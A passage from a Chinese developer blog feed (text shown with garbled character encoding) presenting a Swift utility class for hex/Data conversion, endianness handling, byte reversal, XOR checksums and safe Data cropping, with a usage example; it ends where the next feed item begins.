<li>å¤§ç«¯ / å°ç«¯æ•´æ•°è½¬æ¢</li>
<li>å­—èŠ‚å€’åº</li>
<li>å¼‚æˆ–æ ¡éªŒ</li>
<li>å®‰å…¨è£å‰ªäºŒè¿›åˆ¶æ•°æ®</li>
</ul>
<p>ä¹‹å‰æˆ‘å†™è¿‡ä¸€ä¸ªã€ŠObjective-C ç‰ˆçš„ ParseDataTool å·¥å…·ç±»ã€‹ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç»™å‡ºå®Œæ•´çš„ Swift ç‰ˆæœ¬å®ç°ï¼Œå¹¶åšäº†ä¸€äº›æ›´â€œSwiftyâ€çš„æ”¹é€ ï¼Œæ›´é€‚åˆä½œä¸º Swift é¡¹ç›®ä¸­çš„é€šç”¨å·¥å…·ç±»ã€‚</p>
<h3 data-id="heading-1">å·¥å…·ç±»æ•´ä½“ç»“æ„</h3>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ª <code>final class ParseDataTool</code> æ¥å°è£…æ‰€æœ‰é™æ€å·¥å…·æ–¹æ³•ï¼Œæ–¹ä¾¿åœ¨é¡¹ç›®ä¸­å…¨å±€è°ƒç”¨ï¼š</p>
<ul>
<li><code>transLittleEndianDataToInteger(_:)</code>ï¼šå°ç«¯ Data â†’ Int</li>
<li><code>convertDataToInteger(_:)</code>ï¼šå¤§ç«¯ Data â†’ Int</li>
<li><code>transDataToHexString(_:)</code>ï¼šData â†’ Hex å­—ç¬¦ä¸²</li>
<li><code>transToData(hexString:)</code>ï¼šHex å­—ç¬¦ä¸² â†’ Data</li>
<li><code>invertedOrder(_:)</code>ï¼šæŒ‰å­—èŠ‚å€’åº</li>
<li><code>convertToDecimal(fromHex:)</code>ï¼šåå…­è¿›åˆ¶å­—ç¬¦ä¸² â†’ åè¿›åˆ¶ Int</li>
<li><code>describeBlankFormat(_:)</code>ï¼š<code>"aabbcc"</code> â†’ <code>"aa bb cc"</code></li>
<li><code>describeBytesFormat(_:)</code>ï¼š<code>"aabbcc"</code> â†’ <code>"0xaa, 0xbb, 0xcc"</code></li>
<li><code>transStringToBigMode(_:)</code>ï¼šæŒ‰å­—èŠ‚å€’åº = å°ç«¯è½¬å¤§ç«¯æ˜¾ç¤º</li>
<li><code>convert(data:)</code>ï¼šData å­—èŠ‚åºç¿»è½¬</li>
<li><code>numswap(_:)</code>ï¼š16 ä½æ•´æ•°å­—èŠ‚äº’æ¢</li>
<li><code>xor(dataString:)</code>ï¼šå­—ç¬¦ä¸²æŒ‰å­—èŠ‚å¼‚æˆ–</li>
<li><code>compareImageData(_:withXORValue:)</code>ï¼šData å¼‚æˆ–ç»“æœå¯¹æ¯”</li>
<li><code>subData(_:range:)</code>ï¼šå®‰å…¨è£å‰ª Dataï¼Œé˜²æ­¢è¶Šç•Œå´©æºƒ</li>
</ul>
<p>å®Œæ•´ Swift ç‰ˆæœ¬ ParseDataTool.swift</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  ParseDataTool.swift</span>
<span class="hljs-comment">//  æ•°æ®è½¬æ¢å·¥å…·ç±»ï¼ˆSwiftç‰ˆï¼‰</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by tb on 2025/12/08.</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">import</span> Foundation

<span class="hljs-comment">/// æ•°æ®è½¬æ¢å·¥å…·ç±»ï¼ˆSwift ç‰ˆæœ¬ï¼‰</span>
<span class="hljs-comment">///</span>
<span class="hljs-comment">/// åŠŸèƒ½ï¼š</span>
<span class="hljs-comment">/// - åå…­è¿›åˆ¶å­—ç¬¦ä¸² â†” Data</span>
<span class="hljs-comment">/// - å¤§ç«¯ / å°ç«¯æ•´æ•°è½¬æ¢</span>
<span class="hljs-comment">/// - å­—èŠ‚å€’åº</span>
<span class="hljs-comment">/// - å¼‚æˆ–æ ¡éªŒ</span>
<span class="hljs-comment">/// - å®‰å…¨è£å‰ª Data</span>
<span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParseDataTool</span> {
    
    <span class="hljs-comment">// MARK: - åå…­è¿›åˆ¶ä¸æ•´æ•°è½¬æ¢</span>
    
    <span class="hljs-comment">/// å°†å°ç«¯æ¨¡å¼çš„ Data è½¬ä¸º Int32 å¯¹åº”çš„ Int</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼ˆå°ç«¯ï¼‰</span>
    <span class="hljs-comment">/// - Returns: è½¬æ¢åçš„ Int å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transLittleEndianDataToInteger</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        
        <span class="hljs-keyword">var</span> value: <span class="hljs-type">UInt32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">let</span> count <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(<span class="hljs-type">MemoryLayout</span>&lt;<span class="hljs-type">UInt32</span>&gt;.size, data.count)
        
        withUnsafeMutableBytes(of: <span class="hljs-operator">&amp;</span>value) { buffer <span class="hljs-keyword">in</span>
            data.copyBytes(to: buffer, count: count)
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(<span class="hljs-type">UInt32</span>(littleEndian: value))
    }
    
    <span class="hljs-comment">/// å°†å¤§ç«¯æ¨¡å¼çš„ Data è½¬ä¸º Int32 å¯¹åº”çš„ Int</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼ˆå¤§ç«¯ï¼‰</span>
    <span class="hljs-comment">/// - Returns: è½¬æ¢åçš„ Int å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convertDataToInteger</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        
        <span class="hljs-keyword">var</span> value: <span class="hljs-type">UInt32</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
        <span class="hljs-keyword">let</span> count <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(<span class="hljs-type">MemoryLayout</span>&lt;<span class="hljs-type">UInt32</span>&gt;.size, data.count)
        
        withUnsafeMutableBytes(of: <span class="hljs-operator">&amp;</span>value) { buffer <span class="hljs-keyword">in</span>
            data.copyBytes(to: buffer, count: count)
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(<span class="hljs-type">UInt32</span>(bigEndian: value))
    }
    
    <span class="hljs-comment">// MARK: - åå…­è¿›åˆ¶ä¸å­—ç¬¦ä¸²è½¬æ¢</span>
    
    <span class="hljs-comment">/// å°† Data è½¬ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå°å†™ï¼‰</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹äºŒè¿›åˆ¶æ•°æ®</span>
    <span class="hljs-comment">/// - Returns: ä¾‹å¦‚ï¼š`&lt;aa bb cc&gt;` -&gt; `"aabbcc"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transDataToHexString</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">return</span> data.map { <span class="hljs-type">String</span>(format: <span class="hljs-string">"%02x"</span>, <span class="hljs-variable">$0</span>) }.joined()
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸º Data</span>
    <span class="hljs-comment">/// - Parameter hexString: ä¾‹å¦‚ `"1234edaced0204ff23"` æˆ–ä¸­é—´å¸¦ç©ºæ ¼çš„ `"12 34 ed ac"`</span>
    <span class="hljs-comment">/// - Returns: å¯¹åº”çš„ Data</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transToData</span>(<span class="hljs-params">hexString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">let</span> cleanString <span class="hljs-operator">=</span> hexString.replacingOccurrences(of: <span class="hljs-string">" "</span>, with: <span class="hljs-string">""</span>)
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>cleanString.isEmpty, cleanString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
        }
        
        <span class="hljs-keyword">var</span> data <span class="hljs-operator">=</span> <span class="hljs-type">Data</span>(capacity: cleanString.count <span class="hljs-operator">/</span> <span class="hljs-number">2</span>)
        
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> cleanString.startIndex
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> cleanString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> cleanString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byteString <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(cleanString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(byteString, radix: <span class="hljs-number">16</span>) {
                data.append(byte)
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è§£æå¤±è´¥ï¼Œè¿”å›å½“å‰å·²è§£æéƒ¨åˆ†ï¼ˆä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥è¿”å›ç©ºï¼‰</span>
                <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
            }
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> data
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²æŒ‰ç…§æ¯ 1 å­—èŠ‚ï¼ˆ2 ä¸ªå­—ç¬¦ï¼‰è¿›è¡Œå€’åº</span>
    <span class="hljs-comment">/// - Parameter str: ä¾‹å¦‚ `"a7000003"` -&gt; `"030000a7"`</span>
    <span class="hljs-comment">/// - Returns: å€’åºä¹‹åçš„å­—ç¬¦ä¸²</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">invertedOrder</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">str</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>str.isEmpty, str.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        
        <span class="hljs-keyword">var</span> result <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> str.endIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&gt;</span> str.startIndex {
            <span class="hljs-keyword">let</span> prevIndex <span class="hljs-operator">=</span> str.index(index, offsetBy: <span class="hljs-operator">-</span><span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> str[prevIndex<span class="hljs-operator">..&lt;</span>index]
            result.append(contentsOf: byte)
            index <span class="hljs-operator">=</span> prevIndex
        }
        
        <span class="hljs-keyword">return</span> result
    }
    
    <span class="hljs-comment">/// å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºåè¿›åˆ¶ Int</span>
    <span class="hljs-comment">/// - Parameter hexString: ä¾‹å¦‚ `"00a1"` -&gt; 161</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convertToDecimal</span>(<span class="hljs-params">fromHex</span> <span class="hljs-params">hexString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>hexString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> }
        <span class="hljs-keyword">return</span> <span class="hljs-type">Int</span>(hexString, radix: <span class="hljs-number">16</span>) <span class="hljs-operator">??</span> <span class="hljs-number">0</span>
    }
    
    <span class="hljs-comment">// MARK: - æ ¼å¼åŒ–è¾“å‡ºè¾…åŠ©</span>
    
    <span class="hljs-comment">/// å°†çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºå¸¦ç©ºæ ¼æ ¼å¼</span>
    <span class="hljs-comment">/// - Example: `"aabbccdd"` -&gt; `"aa bb cc dd"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">describeBlankFormat</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">guard</span> dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> dataString }
        
        <span class="hljs-keyword">var</span> components: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            components.append(byte)
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> components.joined(separator: <span class="hljs-string">" "</span>)
    }
    
    <span class="hljs-comment">/// å°†çº¯åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬ä¸ºå¸¦ 0x å‰ç¼€ã€é€—å·åˆ†éš”æ ¼å¼</span>
    <span class="hljs-comment">/// - Example: `"aabbccdd"` -&gt; `"0xaa, 0xbb, 0xcc, 0xdd"`</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">describeBytesFormat</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">""</span> }
        <span class="hljs-keyword">guard</span> dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> dataString }
        
        <span class="hljs-keyword">var</span> components: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            components.append(<span class="hljs-string">"0x<span class="hljs-subst">\(byte)</span>"</span>)
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> components.joined(separator: <span class="hljs-string">", "</span>)
    }
    
    <span class="hljs-comment">// MARK: - å¤§å°ç«¯ä¸å­—ç¬¦ä¸²å¤„ç†</span>
    
    <span class="hljs-comment">/// å°†å­—ç¬¦ä¸²è§†ä¸ºå°ç«¯åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œè½¬ä¸ºå¤§ç«¯æ˜¾ç¤ºï¼ˆæŒ‰å­—èŠ‚å€’åºï¼‰</span>
    <span class="hljs-comment">/// - Parameter string: å°ç«¯å­—èŠ‚åºè¡¨ç¤ºçš„å­—ç¬¦ä¸²</span>
    <span class="hljs-comment">/// - Returns: æŒ‰å¤§ç«¯é¡ºåºæ˜¾ç¤ºçš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">transStringToBigMode</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">string</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">return</span> invertedOrder(string)
    }
    
    <span class="hljs-comment">/// åè½¬ Data çš„å­—èŠ‚é¡ºåºï¼ˆå¤§å°ç«¯è½¬æ¢æ—¶å¯ç”¨ï¼‰</span>
    <span class="hljs-comment">/// - Parameter data: åŸå§‹æ•°æ®</span>
    <span class="hljs-comment">/// - Returns: å­—èŠ‚åè½¬åçš„æ•°æ®</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params">data</span>: <span class="hljs-type">Data</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>(data.reversed())
    }
    
    <span class="hljs-comment">/// å°† 16 ä½æ— ç¬¦å·æ•°çš„é«˜ä½å­—èŠ‚äº’æ¢</span>
    <span class="hljs-comment">/// - Parameter len: åŸå§‹ Int</span>
    <span class="hljs-comment">/// - Returns: å­—èŠ‚äº¤æ¢ä¹‹åçš„ UInt16</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">numswap</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">len</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">UInt16</span> {
        <span class="hljs-keyword">let</span> value <span class="hljs-operator">=</span> <span class="hljs-type">UInt16</span>(len)
        <span class="hljs-keyword">return</span> (value <span class="hljs-operator">&gt;&gt;</span> <span class="hljs-number">8</span>) <span class="hljs-operator">|</span> (value <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-number">8</span>)
    }
    
    <span class="hljs-comment">// MARK: - å¼‚æˆ–è®¡ç®—ä¸æ ¡éªŒ</span>
    
    <span class="hljs-comment">/// å¯¹åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—èŠ‚åšå¼‚æˆ–è¿ç®—</span>
    <span class="hljs-comment">/// - Parameter dataString: ä¾‹å¦‚ `"030a2713ea"`</span>
    <span class="hljs-comment">/// - Returns: å¼‚æˆ–ç»“æœï¼Œä¾‹å¦‚ `"5f"`ï¼ˆä¸¾ä¾‹ï¼‰</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">dataString</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-type">String</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>dataString.isEmpty, dataString.count <span class="hljs-operator">%</span> <span class="hljs-number">2</span> <span class="hljs-operator">==</span> <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-string">"00"</span> }
        
        <span class="hljs-keyword">var</span> xorResult: <span class="hljs-type">UInt8</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x00</span>
        <span class="hljs-keyword">var</span> index <span class="hljs-operator">=</span> dataString.startIndex
        
        <span class="hljs-keyword">while</span> index <span class="hljs-operator">&lt;</span> dataString.endIndex {
            <span class="hljs-keyword">let</span> nextIndex <span class="hljs-operator">=</span> dataString.index(index, offsetBy: <span class="hljs-number">2</span>)
            <span class="hljs-keyword">let</span> byteStr <span class="hljs-operator">=</span> <span class="hljs-type">String</span>(dataString[index<span class="hljs-operator">..&lt;</span>nextIndex])
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> byte <span class="hljs-operator">=</span> <span class="hljs-type">UInt8</span>(byteStr, radix: <span class="hljs-number">16</span>) {
                xorResult <span class="hljs-operator">^=</span> byte
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"00"</span>
            }
            index <span class="hljs-operator">=</span> nextIndex
        }
        
        <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>(format: <span class="hljs-string">"%02x"</span>, xorResult)
    }
    
    <span class="hljs-comment">/// å¯¹ Data çš„æ‰€æœ‰å­—èŠ‚åšå¼‚æˆ–ï¼Œå†ä¸ç»™å®šå€¼æ¯”è¾ƒæ˜¯å¦ä¸€è‡´</span>
    <span class="hljs-comment">/// - Parameters:</span>
    <span class="hljs-comment">///   - imageData: äºŒè¿›åˆ¶æ•°æ®ï¼ˆæ¯”å¦‚å›¾ç‰‡åŸå§‹ Dataï¼‰</span>
    <span class="hljs-comment">///   - xorValue: æœŸæœ›çš„å¼‚æˆ–ç»“æœ</span>
    <span class="hljs-comment">/// - Returns: æ˜¯å¦åŒ¹é…</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">compareImageData</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">imageData</span>: <span class="hljs-type">Data</span>, <span class="hljs-params">withXORValue</span> <span class="hljs-params">xorValue</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Bool</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>imageData.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> }
        
        <span class="hljs-keyword">var</span> result: <span class="hljs-type">UInt8</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x00</span>
        imageData.forEach { byte <span class="hljs-keyword">in</span>
            result <span class="hljs-operator">^=</span> byte
        }
        
        <span class="hljs-keyword">return</span> result <span class="hljs-operator">==</span> <span class="hljs-type">UInt8</span>(xorValue <span class="hljs-operator">&amp;</span> <span class="hljs-number">0xFF</span>)
    }
    
    <span class="hljs-comment">// MARK: - å®‰å…¨çš„æ•°æ®è£å‰ª</span>
    
    <span class="hljs-comment">/// å®‰å…¨è£å‰ª Dataï¼Œå¦‚æœè¶Šç•Œåˆ™è¿”å›ç©º Dataï¼Œè€Œä¸æ˜¯å´©æºƒ</span>
    <span class="hljs-comment">/// - Parameters:</span>
    <span class="hljs-comment">///   - data: åŸå§‹æ•°æ®</span>
    <span class="hljs-comment">///   - range: NSRangeï¼ˆé€šå¸¸æ¥è‡ªå¤–éƒ¨åè®®å®šä¹‰ï¼‰</span>
    <span class="hljs-comment">/// - Returns: å­ Data æˆ–ç©º Data</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">subData</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">data</span>: <span class="hljs-type">Data</span>, <span class="hljs-params">range</span>: <span class="hljs-type">NSRange</span>) -&gt; <span class="hljs-type">Data</span> {
        <span class="hljs-keyword">guard</span> <span class="hljs-operator">!</span>data.isEmpty <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>() }
        <span class="hljs-keyword">let</span> start <span class="hljs-operator">=</span> range.location
        <span class="hljs-keyword">let</span> end <span class="hljs-operator">=</span> range.location <span class="hljs-operator">+</span> range.length
        
        <span class="hljs-keyword">guard</span> start <span class="hljs-operator">&gt;=</span> <span class="hljs-number">0</span>,
              range.length <span class="hljs-operator">&gt;=</span> <span class="hljs-number">0</span>,
              end <span class="hljs-operator">&lt;=</span> data.count <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Data</span>()
        }
        
        <span class="hljs-keyword">let</span> swiftRange <span class="hljs-operator">=</span> start<span class="hljs-operator">..&lt;</span>end
        <span class="hljs-keyword">return</span> data.subdata(in: swiftRange)
    }
}

</code></pre>
<p>ç®€å•ä½¿ç”¨ç¤ºä¾‹</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> hex <span class="hljs-operator">=</span> <span class="hljs-string">"aabbccdd"</span>

<span class="hljs-comment">// Hex -&gt; Data</span>
<span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transToData(hexString: hex)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"data ="</span>, data <span class="hljs-keyword">as</span> <span class="hljs-type">NSData</span>)

<span class="hljs-comment">// Data -&gt; Hex</span>
<span class="hljs-keyword">let</span> hexStr <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transDataToHexString(data)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"hexStr ="</span>, hexStr)      <span class="hljs-comment">// aabbccdd</span>

<span class="hljs-comment">// å­—èŠ‚å€’åº</span>
<span class="hljs-keyword">let</span> inverted <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.invertedOrder(hex)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"inverted ="</span>, inverted)  <span class="hljs-comment">// ddccbbaa</span>

<span class="hljs-comment">// å¯è¯»æ ¼å¼</span>
<span class="hljs-built_in">print</span>(<span class="hljs-type">ParseDataTool</span>.describeBlankFormat(hex))     <span class="hljs-comment">// aa bb cc dd</span>
<span class="hljs-built_in">print</span>(<span class="hljs-type">ParseDataTool</span>.describeBytesFormat(hex))     <span class="hljs-comment">// 0xaa, 0xbb, 0xcc, 0xdd</span>

<span class="hljs-comment">// å°ç«¯ Data -&gt; Int</span>
<span class="hljs-keyword">let</span> littleEndian <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transToData(hexString: <span class="hljs-string">"78563412"</span>)
<span class="hljs-keyword">let</span> intValue <span class="hljs-operator">=</span> <span class="hljs-type">ParseDataTool</span>.transLittleEndianDataToInteger(littleEndian)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"intValue ="</span>, intValue)  <span class="hljs-comment">// 305419896 (0x12345678)</span>

</code></pre>
<p>è¿™ç¯‡æ–‡ç« æŠŠæˆ‘ä¹‹å‰åœ¨å®é™…å¼€å‘é¡¹ç›®ä¸­åŸæ¥çš„ä½¿ç”¨åˆ°äºŒè¿›åˆ¶çš„ç›¸å…³è½¬æ¢å¤„ç†ï¼Œå®Œæ•´è¿ç§»æˆäº† <strong>Swift ç‰ˆæœ¬ ParseDataTool.swift</strong>ï¼ŒåŒæ—¶ï¼š</p>
<ul>
<li>ä¿ç•™äº†åŸæœ‰çš„æ‰€æœ‰åŠŸèƒ½æ–¹æ³•ï¼›</li>
<li>æŒ‰ç…§ Swift çš„ä¹ æƒ¯ä½¿ç”¨äº† <code>static func</code>ã€<code>Data</code>ã€<code>String</code> çš„å®‰å…¨ä¸‹æ ‡ç­‰ï¼›</li>
<li>åœ¨ä¸æ”¹å˜è¯­ä¹‰çš„å‰æä¸‹ï¼Œåšäº†ä¸€äº›æ›´â€œSwift é£æ ¼â€çš„å°è£…ã€‚</li>
</ul>
<p>ä½ å¯ä»¥ç›´æ¥åœ¨é¡¹ç›®ä¸­åˆ›å»ºä¸€ä¸ª <code>ParseDataTool.swift</code> æ–‡ä»¶ï¼ŒæŠŠä¸Šé¢çš„ä»£ç è´´è¿›å»å°±èƒ½ç”¨.</p>
<p>å¦‚æœ‰è¯´é”™çš„åœ°æ–¹æ¬¢è¿æŒ‡æ­£ï¼Œç›¸äº’å­¦ä¹ ~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueä¸­çš„watch]]></title>    <link>https://juejin.cn/post/7580971667037339674</link>    <guid>https://juejin.cn/post/7580971667037339674</guid>    <pubDate>2025-12-08T05:43:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580971667037339674" data-draft-id="7581025279645614118" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueä¸­çš„watch"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2025-12-08T05:43:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta 